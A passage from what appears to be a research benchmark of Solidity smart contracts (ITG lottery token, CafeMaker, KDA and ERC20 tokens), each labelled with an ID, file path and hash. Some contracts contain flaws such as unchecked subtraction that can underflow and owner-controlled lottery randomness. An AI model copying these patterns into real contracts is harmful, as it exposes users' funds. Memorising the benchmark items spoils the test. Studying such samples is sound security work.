        r.inTimeRange_Y = _inTimeRange_Y;   
    }
    modifier beforeRangeGame(){
        require(now > d.gameStart && now <= d.gameEnd);
        _;
    }
    modifier beforePointGame(){
        refreshGameTime();
        _;
    }
    function process(address sender, uint sendValue) onlyOwner {
        if(c.gameType == GameType.Range){
            RangeGameProcess(sender, sendValue);
        }else if(c.gameType == GameType.Point){
            PointGameProcess(sender, sendValue);
        }
    }
    function processWithITG(address sender, uint tokenAmountToGame) onlyOwner {
        if(c.gameType == GameType.Range){
            RangeGameWithITG(sender, tokenAmountToGame);
        }else if(c.gameType == GameType.Point){
            PointGameWithITG(sender, tokenAmountToGame);
        }
    }
    function RangeGameProcess(address sender, uint sendValue) private beforeRangeGame {
        if(c.currentGameTimeType == GameTime.Year){
            c.yearlyAmountEth = add(c.yearlyAmountEth, sendValue);
            f.yearlyStatusEth = add(f.yearlyStatusEth, sendValue);
        }else if(c.currentGameTimeType == GameTime.Month){
            c.monthlyAmountEth = add(c.monthlyAmountEth, sendValue);
            f.monthlyStatusEth = add(f.monthlyStatusEth, sendValue);
        }else if(c.currentGameTimeType == GameTime.Hour){
            c.hourlyAmountEth = add(c.hourlyAmountEth, sendValue);
            f.hourlyStatusEth = add(f.hourlyStatusEth, sendValue);
        }
        participants.push(Participant(sender,sendValue,1));
        if(p.bonusPerEth != 0){
            tokTakers[d.currentYear][sender] = add(tokTakers[d.currentYear][sender], sendValue * p.bonusPerEth);
            tokPrizes[d.currentYear] = add(tokPrizes[d.currentYear], sendValue * p.bonusPerEth);
        }
    }
    function RangeGameWithITG(address sender, uint tokenAmountToGame) private beforeRangeGame {
        require(c.currentGameTimeType != GameTime.Year);
        if(c.currentGameTimeType == GameTime.Month){
            f.monthlyStatusTok = add(f.monthlyStatusTok, tokenAmountToGame);
        }else if(c.currentGameTimeType == GameTime.Hour){
            f.hourlyStatusTok = add(f.hourlyStatusTok, tokenAmountToGame);
        }
        participants.push(Participant(sender,tokenAmountToGame,2));
    }
    function getTimeRangeInfo() private returns (GameTime, uint, uint, uint) {
        uint nextTimeStamp;
        uint nextYear;
        uint nextMonth;
        uint basis;
        if(c.gameType == GameType.Range){
            nextTimeStamp = now + r.inTimeRange_Y * 1 minutes + 1 hours;
            nextYear = getYear(nextTimeStamp);
            if(getYear(now - r.inTimeRange_Y * 1 minutes + 1 hours) != nextYear){
                basis = nextTimeStamp - (nextTimeStamp % 1 days);    
                return (GameTime.Year, nextYear, basis - r.inTimeRange_Y * 1 minutes, basis + r.inTimeRange_Y * 1 minutes);
            }
            nextTimeStamp = now + r.inTimeRange_M * 1 minutes + 1 hours;
            nextMonth = getMonth(nextTimeStamp);
            if(getMonth(now - r.inTimeRange_M * 1 minutes + 1 hours) != nextMonth){
                basis = nextTimeStamp - (nextTimeStamp % 1 days); 
                return (GameTime.Month, nextYear, basis - r.inTimeRange_M * 1 minutes, basis + r.inTimeRange_M * 1 minutes);
            }
            nextTimeStamp = now + r.inTimeRange_H * 1 minutes + 1 hours;
            basis = nextTimeStamp - (nextTimeStamp % 1 hours); 
            return (GameTime.Hour, nextYear, basis - r.inTimeRange_H * 1 minutes, basis + r.inTimeRange_H * 1 minutes);
        }else if(c.gameType == GameType.Point){
            nextTimeStamp = now - (now % 1 hours) + 1 hours;
            nextYear = getYear(nextTimeStamp);
            if(getYear(now) != nextYear){
                return (GameTime.Year, nextYear, 0, nextTimeStamp);
            }
            nextMonth = getMonth(nextTimeStamp);
            if(getMonth(now) != nextMonth){
                return (GameTime.Month, nextYear, 0, nextTimeStamp);
            }
            return (GameTime.Hour, nextYear, 0, nextTimeStamp);
        }
    }
    function refreshGameTime() private {
        (c.currentGameTimeType, d.currentYear, d.gameStart, d.gameEnd) = getTimeRangeInfo();
    }
    function gcFundAmount() private {
        f.hourlyStatusEth = 0;
        f.monthlyStatusEth = 0;
        f.yearlyStatusEth = 0;
        f.hourlyStatusTok = 0;
        f.monthlyStatusTok = 0;
    }
    function selectWinner(uint rand) onlyOwner {
        uint luckyNumber = participants.length * rand / 100000000;
        uint rewardDiv100 = 0;
        uint participateRatio = participants.length;
        if(participateRatio != 0){
            if(c.currentGameTimeType == GameTime.Year){
                participateRatio = participateRatio > p.yearlyMinParticipateRatio?participateRatio:p.yearlyMinParticipateRatio;
            }else if(c.currentGameTimeType == GameTime.Month){
                participateRatio = participateRatio > p.monthlyMinParticipateRatio?participateRatio:p.monthlyMinParticipateRatio;
            }else if(c.currentGameTimeType == GameTime.Hour){
                participateRatio = participateRatio > p.hourlyMinParticipateRatio?participateRatio:p.hourlyMinParticipateRatio;
            }
            if(participants[luckyNumber].currency == 1){
                rewardDiv100 = participants[luckyNumber].value * participateRatio * p.boostPrizeEth / 100 / 100;
                if(p.currentInGameTokWinRatio < p.inGameTokWinRatioMax){
                    p.currentInGameTokWinRatio++;
                }
            }else if(participants[luckyNumber].currency == 2){
                rewardDiv100 = (participants[luckyNumber].value / p.inGameTokPricePerEth * p.currentInGameTokWinRatio / 100) * participateRatio / 100;
                if(p.currentInGameTokWinRatio > p.inGameTokWinRatioMin){
                    p.currentInGameTokWinRatio--;
                }
            }
            if(c.currentGameTimeType == GameTime.Year){
                if(c.yearlyAmountEth >= rewardDiv100*104){  
                    c.yearlyAmountEth = sub(c.yearlyAmountEth, rewardDiv100*104);
                }else{
                    rewardDiv100 = c.yearlyAmountEth / 104;
                    c.yearlyAmountEth = 0;
                }
            }else if(c.currentGameTimeType == GameTime.Month){
                if(c.monthlyAmountEth >= rewardDiv100*107){    
                    c.monthlyAmountEth = sub(c.monthlyAmountEth, rewardDiv100*107);
                }else{
                    rewardDiv100 = c.monthlyAmountEth / 107;
                    c.monthlyAmountEth = 0;
                }
                c.yearlyAmountEth = add(c.yearlyAmountEth,rewardDiv100 * 3); 
            }else if(c.currentGameTimeType == GameTime.Hour){
                if(c.hourlyAmountEth >= rewardDiv100*110){
                    c.hourlyAmountEth = sub(c.hourlyAmountEth, rewardDiv100*110);
                }else{
                    rewardDiv100 = c.hourlyAmountEth / 110;
                    c.hourlyAmountEth = 0;
                }
                c.monthlyAmountEth = add(c.monthlyAmountEth,rewardDiv100 * 3);
                c.yearlyAmountEth = add(c.yearlyAmountEth,rewardDiv100 * 3);
            }
            c.charityAmountEth = add(c.charityAmountEth,rewardDiv100 * 4);
            winners[d.currentYear][participants[luckyNumber].sender] = add(winners[d.currentYear][participants[luckyNumber].sender],rewardDiv100*100);
            winPrizes[d.currentYear] = add(winPrizes[d.currentYear],rewardDiv100*100);
            LogSelectWinner(rand, luckyNumber, participants[luckyNumber].sender, rewardDiv100*100, participants[luckyNumber].currency, participants[luckyNumber].value);
            participants.length = 0;
        }
        if(c.gameType == GameType.Range){
            refreshGameTime();
        }
        gcFundAmount();    
    }
    function getPrize(address sender) onlyOwner returns (uint ethPrize, uint tokPrize) {
        ethPrize = add(winners[d.currentYear][sender],winners[d.currentYear-1][sender]);
        tokPrize = add(tokTakers[d.currentYear][sender],tokTakers[d.currentYear-1][sender]);
        winPrizes[d.currentYear] = sub(winPrizes[d.currentYear],winners[d.currentYear][sender]);
        tokPrizes[d.currentYear] = sub(tokPrizes[d.currentYear],tokTakers[d.currentYear][sender]);
        winners[d.currentYear][sender] = 0;
        tokTakers[d.currentYear][sender] = 0;
        winPrizes[d.currentYear-1] = sub(winPrizes[d.currentYear-1],winners[d.currentYear-1][sender]);
        tokPrizes[d.currentYear-1] = sub(tokPrizes[d.currentYear-1],tokTakers[d.currentYear-1][sender]);
        winners[d.currentYear-1][sender] = 0;
        tokTakers[d.currentYear-1][sender] = 0;
    }
    function PointGameProcess(address sender, uint sendValue) private beforePointGame {
        if(c.currentGameTimeType == GameTime.Year){
            c.yearlyAmountEth = add(c.yearlyAmountEth, sendValue);
            f.yearlyStatusEth = add(f.yearlyStatusEth, sendValue);
        }else if(c.currentGameTimeType == GameTime.Month){
            c.monthlyAmountEth = add(c.monthlyAmountEth, sendValue);
            f.monthlyStatusEth = add(f.monthlyStatusEth, sendValue);
        }else if(c.currentGameTimeType == GameTime.Hour){
            c.hourlyAmountEth = add(c.hourlyAmountEth, sendValue);
            f.hourlyStatusEth = add(f.hourlyStatusEth, sendValue);
        }
        PointGameParticipate(sender, sendValue, 1);
        if(p.bonusPerEth != 0){
            tokTakers[d.currentYear][sender] = add(tokTakers[d.currentYear][sender], sendValue * p.bonusPerEth);
            tokPrizes[d.currentYear] = add(tokPrizes[d.currentYear], sendValue * p.bonusPerEth);
        }
    }
    function PointGameWithITG(address sender, uint tokenAmountToGame) private beforePointGame {
        require(c.currentGameTimeType != GameTime.Year);
        if(c.currentGameTimeType == GameTime.Month){
            f.monthlyStatusTok = add(f.monthlyStatusTok, tokenAmountToGame);
        }else if(c.currentGameTimeType == GameTime.Hour){
            f.hourlyStatusTok = add(f.hourlyStatusTok, tokenAmountToGame);
        }
        PointGameParticipate(sender, tokenAmountToGame, 2);
    }
    function PointGameParticipate(address sender, uint sendValue, uint currency) private {
        if(d.prevGameEnd != d.gameEnd){
            selectWinner(1);
        }
        participants.length = 0;
        participants.push(Participant(sender,sendValue,currency));
        d.prevGameEnd = d.gameEnd;
    }
    function lossToCharity(uint year) onlyOwner returns (uint amt) {
        require(year < d.currentYear-1);
        amt = winPrizes[year];
        tokPrizes[year] = 0;
        winPrizes[year] = 0;
    }
    function charityAmtToCharity() onlyOwner returns (uint amt) {
        amt = c.charityAmountEth;
        c.charityAmountEth = 0;
    }
    function distributeTokenSale(uint hour, uint month, uint year, uint charity) onlyOwner{
        c.hourlyAmountEth = add(c.hourlyAmountEth, hour);
        c.monthlyAmountEth = add(c.monthlyAmountEth, month);
        c.yearlyAmountEth = add(c.yearlyAmountEth, year);
        c.charityAmountEth = add(c.charityAmountEth, charity);
    }
}
contract ITGToken is ITGTokenBase, Authable {
    bytes32  public  symbol = "ITG";
    uint256  public  decimals = 18;
    bytes32   public  name = "ITG";
    enum Status { CrowdSale, Game, Pause }
    Status public status;
    CrowdSale crowdSale;
    Games games;
    Voting voting;
    mapping(address => uint) public withdrawRestriction;
    uint public minEtherParticipate;
    uint public minTokParticipate;
    event LogFundTransfer(address sender, address to, uint amount, uint8 currency);
    modifier beforeTransfer(){
        require(withdrawRestriction[msg.sender] < now);
        _;
    }
    function transfer(address _to, uint _value) beforeTransfer returns (bool success) {
        balances[msg.sender] = sub(balances[msg.sender], _value);
        balances[_to] = add(balances[_to], _value);
        Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint _value) beforeTransfer returns (bool success) {
        uint _allowance = allowed[_from][msg.sender];
        balances[_to] = add(balances[_to], _value);
        balances[_from] = sub(balances[_from], _value);
        allowed[_from][msg.sender] = sub(_allowance, _value);
        Transfer(_from, _to, _value);
        return true;
    }
    function ITGToken() {
        owner = msg.sender;
        totalSupply = 100000000 * 1 ether;
        balances[msg.sender] = totalSupply;
        status = Status.Pause;
    }
    function () payable {
       if(msg.value < minEtherParticipate){
            throw;
       }
       if(status == Status.CrowdSale){
            LogFundTransfer(msg.sender, 0x0, msg.value, 1);
            itgTokenTransfer(crowdSale.process(msg.sender,msg.value),true);
       }else if(status == Status.Game){
            LogFundTransfer(msg.sender, 0x0, msg.value, 1);
            games.process(msg.sender, msg.value);
       }else if(status == Status.Pause){
            throw;
       }
    }
    function setAttrs(address csAddr, address gmAddr, address vtAddr, Status _status, uint amtEth, uint amtTok) onlyAuth {
        crowdSale = CrowdSale(csAddr);
        games = Games(gmAddr);
        voting = Voting(vtAddr);
        status = _status;
        minEtherParticipate = amtEth;
        minTokParticipate = amtTok;
    }
    function USER_GET_CROWDSALE_TOKEN() {
        itgTokenTransfer(crowdSale.getToken(msg.sender),true);
    }
    function USER_VOTE(uint voteId, uint candidateId){
        uint addedToken;
        uint lockUntil;
        (addedToken, lockUntil) = voting.vote(msg.sender,balances[msg.sender],voteId,candidateId);
        itgTokenTransfer(addedToken,true);
        if(withdrawRestriction[msg.sender] < lockUntil){
            withdrawRestriction[msg.sender] = lockUntil;
        }
    }
    function voteInitiate(uint voteId, uint voteRewardPerUnit, uint voteWeightUnit, uint voteStart, uint voteEnd, uint maxCandidateId) onlyAuth {
        voting.voteInitiate(voteId, voteRewardPerUnit, voteWeightUnit, voteStart, voteEnd, maxCandidateId);
    }
    function itgTokenTransfer(uint amt, bool fromOwner) private {
        if(amt > 0){
            if(fromOwner){
                balances[owner] = sub(balances[owner], amt);
                balances[msg.sender] = add(balances[msg.sender], amt);
                Transfer(owner, msg.sender, amt);
                LogFundTransfer(owner, msg.sender, amt, 2);
            }else{
                balances[owner] = add(balances[owner], amt);
                balances[msg.sender] = sub(balances[msg.sender], amt);
                Transfer(msg.sender, owner, amt);
                LogFundTransfer(msg.sender, owner, amt, 2);
            }
        }
    }
    function ethTransfer(address target, uint amt) private {
        if(amt > 0){
            target.transfer(amt);
            LogFundTransfer(0x0, target, amt, 1);
        }
    }
    function USER_GAME_WITH_TOKEN(uint tokenAmountToGame) {
        require(status == Status.Game);
        require(balances[msg.sender] >= tokenAmountToGame * 1 ether);
        require(tokenAmountToGame * 1 ether >= minTokParticipate);
        itgTokenTransfer(tokenAmountToGame * 1 ether,false);
        games.processWithITG(msg.sender, tokenAmountToGame * 1 ether);
    }
    function USER_GET_PRIZE() {
        uint ethPrize;
        uint tokPrize;
        (ethPrize, tokPrize) = games.getPrize(msg.sender);
        itgTokenTransfer(tokPrize,true);
        ethTransfer(msg.sender, ethPrize);
    }
    function selectWinner(uint rand) onlyAuth {
        games.selectWinner(rand);
    }
    function burn(uint amt) onlyOwner {
        balances[msg.sender] = sub(balances[msg.sender], amt);
        totalSupply = sub(totalSupply,amt);
    }
    function mint(uint amt) onlyOwner {
        balances[msg.sender] = add(balances[msg.sender], amt);
        totalSupply = add(totalSupply,amt);
    }
    function lossToCharity(uint year,address charityAccount) onlyAuth {
        ethTransfer(charityAccount, games.lossToCharity(year));
    }
    function charityAmtToCharity(address charityAccount) onlyOwner {
        ethTransfer(charityAccount, games.charityAmtToCharity());
    }
    function distributeTokenSale(uint hour, uint month, uint year, uint charity) onlyAuth{
        games.distributeTokenSale(hour, month, year, charity);
    }
}
```

## RQ1_e6f04047bff4

文件 `units/program.sol`；SHA256 `5c6a307b3121b20be1580fba3bba19129f77a33da27eab1b44d844de40941e5b`；位置按UTF-8字节。

```solidity
contract CafeMaker{
	bool public locked = true;
	uint public CafePayed;
	uint public CafeDelivered;
	uint public PricePerCafe = 50000000000000000; 
	address public DeviceOwner = msg.sender;
	address public DeviceAddr;
	function RegisterDevice() {
		DeviceAddr = msg.sender;
	}
	function BookCafe(){
		if(DeviceAddr != msg.sender)
			throw; 
		CafeDelivered += 1;
		if(CafePayed - CafeDelivered < 1)
			locked=true;
	}
	function CollectMoney(uint amount){
       if (!DeviceOwner.send(amount))
            throw;
	}
    function () {
		CafePayed += (msg.value / PricePerCafe);
		if(CafePayed - CafeDelivered < 1){
			locked=true;
		} else {
			locked=false;
		}
    }
}
```

## RQ1_58de46f081ec

文件 `units/program.sol`；SHA256 `abd2c09b42893ad2efa66516dd3a6a960b55683dd261b4dbef60e21beb3aeb5c`；位置按UTF-8字节。

```solidity
pragma solidity 0.5.0;

contract owned {
    event AutoGenerated_mapping_owned(string mapping_origin, string mapping_cache);
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }

    function transferOwnership(address originNewOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        owner = originNewOwner;
    }
}

interface tokenRecipient {
    event AutoGenerated_mapping_tokenRecipient(string mapping_origin, string mapping_cache);

    function receiveApproval(address _from, uint256 _value, address _token, bytes calldata _extraData) external;
}

contract TokenERC20 {
    event AutoGenerated_mapping_TokenERC20(string mapping_origin, string mapping_cache);
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed from, uint256 value);

    constructor(uint256 initialSupply, string memory tokenName, string memory tokenSymbol) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        name = tokenName;
        symbol = tokenSymbol;
    }

    function _transfer(address _from, address _to, uint _value) internal {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value > balanceOf[_to])) {
            revert();
        }
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        if (!(balanceOf[_from] + balanceOf[_to] == previousBalances)) {
            revert();
        }
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        {
            if (!(_to != address(0x0))) {
                revert();
            }
            if (!(balanceOf[msg.sender] >= _value)) {
                revert();
            }
            if (!(balanceOf[_to] + _value > balanceOf[_to])) {
                revert();
            }
            uint TokenERC20__transfer_3_previousBalances_0_0 = balanceOf[msg.sender] + balanceOf[_to];
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            if (!(balanceOf[msg.sender] + balanceOf[_to] == TokenERC20__transfer_3_previousBalances_0_0)) {
                revert();
            }
        }

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        if (!(_value <= allowance[_from][msg.sender])) {
            revert();
        }
        allowance[_from][msg.sender] -= _value;
        {
            if (!(_to != address(0x0))) {
                revert();
            }
            if (!(balanceOf[_from] >= _value)) {
                revert();
            }
            if (!(balanceOf[_to] + _value > balanceOf[_to])) {
                revert();
            }
            uint TokenERC20__transfer_3_previousBalances_0_0 = balanceOf[_from] + balanceOf[_to];
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(_from, _to, _value);
            if (!(balanceOf[_from] + balanceOf[_to] == TokenERC20__transfer_3_previousBalances_0_0)) {
                revert();
            }
        }

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData) public returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        bool TokenERC20_approve_TMP_34_0_0;
        {
            {
                allowance[msg.sender][_spender] = _value;
                emit Approval(msg.sender, _spender, _value);
                TokenERC20_approve_TMP_34_0_0 = true;
            }
        }
        if (TokenERC20_approve_TMP_34_0_0) {
            spender.receiveApproval(msg.sender, _value, address(this), _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success) {
        if (!(balanceOf[msg.sender] >= _value)) {
            revert();
        }
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        emit Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(_value <= allowance[_from][msg.sender])) {
            revert();
        }
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        totalSupply -= _value;
        emit Burn(_from, _value);
        return true;
    }
}

contract KDA is owned, TokenERC20 {
    event AutoGenerated_mapping_KDA(string mapping_origin, string mapping_cache);
    mapping(address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);

    constructor(uint256 initialSupply, string memory tokenName, string memory tokenSymbol) public TokenERC20(initialSupply, tokenName, tokenSymbol) {}

    function _transfer(address _from, address _to, uint _value) internal {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(balanceOf[_from] >= _value)) {
            revert();
        }
        if (!(balanceOf[_to] + _value >= balanceOf[_to])) {
            revert();
        }
        if (!(!frozenAccount[_from])) {
            revert();
        }
        if (!(!frozenAccount[_to])) {
            revert();
        }
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }

    function mintToken(address target, uint256 mintedAmount) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        emit Transfer(address(0x0), address(this), mintedAmount);
        emit Transfer(address(this), target, mintedAmount);
    }

    function freezeAccount(address target, bool freeze) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
}

```

## RQ1_328c13393c2c

文件 `units/program.sol`；SHA256 `3a5ea6152f06e5677f69c4d3f22171fbb7cd4f0f787f9ab688ee888a702d28de`；位置按UTF-8字节。

```solidity
pragma solidity 0.4.26;

contract SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);
    uint256 public constant MAX_UINT256 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

    function safeAdd(uint256 x, uint256 y) internal constant returns (uint256 z) {
        if (!(x <= MAX_UINT256 - y)) {
            revert();
        }
        return x + y;
    }

    function safeSub(uint256 x, uint256 y) internal constant returns (uint256 z) {
        if (!(x >= y)) {
            revert();
        }
        return x - y;
    }

    function safeMul(uint256 x, uint256 y) internal constant returns (uint256 z) {
        if (y == 0) {
            return 0;
        }
        if (!(x <= (MAX_UINT256 / y))) {
            revert();
        }
        return x * y;
    }
}

contract Owned {
    event AutoGenerated_mapping_Owned(string mapping_origin, string mapping_cache);
    address public owner;
    address public originNewOwner;

    function Owned() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(_newOwner != owner)) {
            revert();
        }
        originNewOwner = _newOwner;
    }

    function acceptOwnership() public {
        if (!(msg.sender == originNewOwner)) {
            revert();
        }
        OwnerUpdate(owner, originNewOwner);
        owner = originNewOwner;
        originNewOwner = address(0x0);
    }

    event OwnerUpdate(address _prevOwner, address _newOwner);
}

contract Lockable is Owned {
    event AutoGenerated_mapping_Lockable(string mapping_origin, string mapping_cache);
    uint256 public lockedUntilBlock;
    event ContractLocked(uint256 _untilBlock, string _reason);
    modifier lockAffected() {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        _;
    }

    function lockFromSelf(uint256 _untilBlock, string _reason) internal {
        lockedUntilBlock = _untilBlock;
        ContractLocked(_untilBlock, _reason);
    }

    function lockUntil(uint256 _untilBlock, string _reason) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        lockedUntilBlock = _untilBlock;
        ContractLocked(_untilBlock, _reason);
    }
}

contract ERC20PrivateInterface {
    event AutoGenerated_mapping_ERC20PrivateInterface(string mapping_origin, string mapping_cache);
    uint256 supply;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowances;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract tokenRecipientInterface {
    event AutoGenerated_mapping_tokenRecipientInterface(string mapping_origin, string mapping_cache);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData);
}

contract OwnedInterface {
    event AutoGenerated_mapping_OwnedInterface(string mapping_origin, string mapping_cache);
    address public owner;
    address public originNewOwner;
    modifier onlyOwner() {
        _;
    }
}

contract ERC20TokenInterface {
    event AutoGenerated_mapping_ERC20TokenInterface(string mapping_origin, string mapping_cache);

    function totalSupply() public constant returns (uint256 _totalSupply);

    function balanceOf(address _owner) public constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract ERC20Token is ERC20TokenInterface, SafeMath, Owned, Lockable {
    event AutoGenerated_mapping_ERC20Token(string mapping_origin, string mapping_cache);
    string public standard;
    string public name;
    string public symbol;
    uint8 public decimals;
    address public mintingContractAddress;
    uint256 supply = 0;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowances;
    event Mint(address indexed _to, uint256 _value);
    event Burn(address indexed _from, uint _value);

    function totalSupply() public constant returns (uint256) {
        return supply;
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        if (!(_to != address(0x0) && _to != address(this))) {
            revert();
        }
        uint256 ERC20Token_balanceOf_TMP_97_0_0;
        {
            {
                ERC20Token_balanceOf_TMP_97_0_0 = balances[msg.sender];
            }
        }
        uint256 ERC20Token_safeSub_TMP_98_0_0;
        {
            uint256 TMP_97_0_0 = ERC20Token_balanceOf_TMP_97_0_0;
            {
                if (!(TMP_97_0_0 >= _value)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_98_0_0 = TMP_97_0_0 - _value;
            }
        }
        balances[msg.sender] = ERC20Token_safeSub_TMP_98_0_0;
        uint256 ERC20Token_balanceOf_TMP_99_1_0;
        {
            {
                ERC20Token_balanceOf_TMP_99_1_0 = balances[_to];
            }
        }
        uint256 ERC20Token_safeAdd_TMP_100_0_0;
        {
            uint256 TMP_99_0_0 = ERC20Token_balanceOf_TMP_99_1_0;
            {
                if (!(TMP_99_0_0 <= MAX_UINT256 - _value)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_100_0_0 = TMP_99_0_0 + _value;
            }
        }
        balances[_to] = ERC20Token_safeAdd_TMP_100_0_0;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        allowances[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        tokenRecipientInterface spender = tokenRecipientInterface(_spender);
        bool ERC20Token_approve_TMP_112_0_0;
        {
            {
                if (!(block.number > lockedUntilBlock)) {
                    revert();
                }
                allowances[msg.sender][_spender] = _value;
                emit Approval(msg.sender, _spender, _value);
                ERC20Token_approve_TMP_112_0_0 = true;
            }
        }

        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        if (!(_to != address(0x0) && _to != address(this))) {
            revert();
        }
        uint256 ERC20Token_balanceOf_TMP_125_0_0;
        {
            {
                ERC20Token_balanceOf_TMP_125_0_0 = balances[_from];
            }
        }
        uint256 ERC20Token_safeSub_TMP_126_0_0;
        {
            uint256 TMP_125_0_0 = ERC20Token_balanceOf_TMP_125_0_0;
            {
                if (!(TMP_125_0_0 >= _value)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_126_0_0 = TMP_125_0_0 - _value;
            }
        }
        balances[_from] = ERC20Token_safeSub_TMP_126_0_0;
        uint256 ERC20Token_balanceOf_TMP_127_1_0;
        {
            {
                ERC20Token_balanceOf_TMP_127_1_0 = balances[_to];
            }
        }
        uint256 ERC20Token_safeAdd_TMP_128_0_0;
        {
            uint256 TMP_127_0_0 = ERC20Token_balanceOf_TMP_127_1_0;
            {
                if (!(TMP_127_0_0 <= MAX_UINT256 - _value)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_128_0_0 = TMP_127_0_0 + _value;
            }
        }
        balances[_to] = ERC20Token_safeAdd_TMP_128_0_0;
        uint256 ERC20Token_safeSub_TMP_129_1_0;
        {
            uint256 REF_11_1_0 = allowances[_from][msg.sender];
            {
                if (!(REF_11_1_0 >= _value)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_129_1_0 = REF_11_1_0 - _value;
            }
        }
        allowances[_from][msg.sender] = ERC20Token_safeSub_TMP_129_1_0;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowances[_owner][_spender];
    }

    function mint(address _to, uint256 _amount) public {
        if (!(msg.sender == mintingContractAddress)) {
            revert();
        }
        uint256 ERC20Token_safeAdd_TMP_135_0_0;
        {
            {
                if (!(supply <= MAX_UINT256 - _amount)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_135_0_0 = supply + _amount;
            }
        }
        supply = ERC20Token_safeAdd_TMP_135_0_0;
        uint256 ERC20Token_safeAdd_TMP_136_1_0;
        {
            uint256 REF_15_1_0 = balances[_to];
            {
                if (!(REF_15_1_0 <= MAX_UINT256 - _amount)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_136_1_0 = REF_15_1_0 + _amount;
            }
        }
        balances[_to] = ERC20Token_safeAdd_TMP_136_1_0;
        emit Mint(_to, _amount);
        emit Transfer(address(0x0), _to, _amount);
    }

    function burn(uint _amount) public {
        uint256 ERC20Token_balanceOf_TMP_140_0_0;
        {
            {
                ERC20Token_balanceOf_TMP_140_0_0 = balances[msg.sender];
            }
        }
        uint256 ERC20Token_safeSub_TMP_141_0_0;
        {
            uint256 TMP_140_0_0 = ERC20Token_balanceOf_TMP_140_0_0;
            {
                if (!(TMP_140_0_0 >= _amount)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_141_0_0 = TMP_140_0_0 - _amount;
            }
        }
        balances[msg.sender] = ERC20Token_safeSub_TMP_141_0_0;
